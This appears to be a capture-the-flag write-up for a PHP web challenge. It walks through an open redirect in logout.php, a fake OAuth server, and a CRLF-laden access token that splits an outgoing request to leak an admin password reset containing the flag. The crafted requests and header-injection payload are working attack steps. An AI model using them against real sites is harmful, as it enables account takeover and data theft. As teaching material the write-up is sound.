# Exploit

This exploit requires a server with external access.

<strong> 1. Change the following three values in your exploit.py file </strong>  

```
TARGET_URI = "http://{{BASE_HOST}}"
HOST = "{{BIND_IP}}"
PORT = {{BIND_PORT}}
```

<strong> 2. run `exploit.py` </strong> 

# Vulnerability

An open redirection attack exists in logout.php via the `return_uri` parameter. 
This vulnerability allows users to bypass validation of the authentication server address.

```php
<?php
    include_once("config.php");
    include_once("auth_service.php");
    session_start();
    request_logout($_SESSION["auth_server"], $CLIENT_ID, $_SESSION["access_token"], $_SESSION["refresh_token"]);

    $_SESSION["username"] = null; 
    $_SESSION["auth_server"] = null;
    $_SESSION["access_token"] = null;
    $_SESSION["refresh_token"] = null;

    $return_uri = $_GET["return_uri"];
    if($return_uri == null)
        $return_uri = $_SERVER["HTTP_REFERER"];
    header("Location: " . $return_uri);
?>
```



# How exploit works

<strong>1. Setup a fake auth server for the below request</strong>

(See the web.py file for details)<br />
`172.28.176.1 - - [05/Jul/2023 20:33:50] "GET /realms/sctf/protocol/openid-connect/token HTTP/1.1" 200 -` <br />
`172.28.176.1 - - [05/Jul/2023 20:33:52] "GET /realms/sctf/protocol/openid-connect/userinfo HTTP/1.1" 200 -`
<br />
<br />
<br />

<strong>2. The below HTTP request will change `$_SESSION['auth_server']` in login.php</strong>

> Open redirection in logout.php

```
GET /login.php?auth_server=http://{TARGET_URI}/sso/../logout.php%3freturn_uri={FAKE_AUTHSERVER} HTTP/1.1
Host: {TARGET_URI}
Cookie: PHPSESSID=hhvtcnmihl1rjb018nl2ne5bj6

```

<br />
<br />

<strong>3. The web server gets a token from the fake auth_server, which contains a value that manipulates HTTP headers. </strong>


> `state` should be matched with the above reponse.

```
GET /callback.php?code=a&state={state} HTTP/1.1
Host: {TARGET_URI}
Cookie: PHPSESSID=hhvtcnmihl1rjb018nl2ne5bj6

```

<br />
<br />

<strong>4. In index.php, make sure your username is 'admin' and access the admin page. </strong>

<br />
<br />

<strong>5. On the admin page, click the Reset password link.</strong>

The "\r\n" in the access token splits the HTTP header into two because of the below code. 

```php
    $headers[] = "Authorization: Bearer " . $access_token;
```

```
{"access_token": f"aa\r\n\r\n\r\nPOST /orders.php HTTP/1.0\r\nHost: {TARGET_URI}\r\nContent-Type: multipart/form-data; boundary=----\r\nContent-Length: {LENGTH}\r\nCookie: PHPSESSID={PHPSESSION}\r\n\r\n------\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n"}
```

- The HTTP request is split like below

```
PUT /sso/admin/realms/sctf/users/f7f10810-87bd-4399-949b-89b87951044a/reset-password HTTP/1.1
Host: {TARGET_URI}
Accept: */*
Authorization: Bearer aa


POST /orders.php HTTP/1.0
Host: {TARGET_URI}
Content-Type: multipart/form-data; boundary=----
Content-Length: {LENGTH}
Cookie: PHPSESSID={PHPSESSION}

------
Content-Disposition: form-data; name=\"name\"

type=password&temporary=0&value=sctf%7bfake_flag%7d
```

<br />
<br />

<strong>6. Find the flag in `/orders.php`</strong>
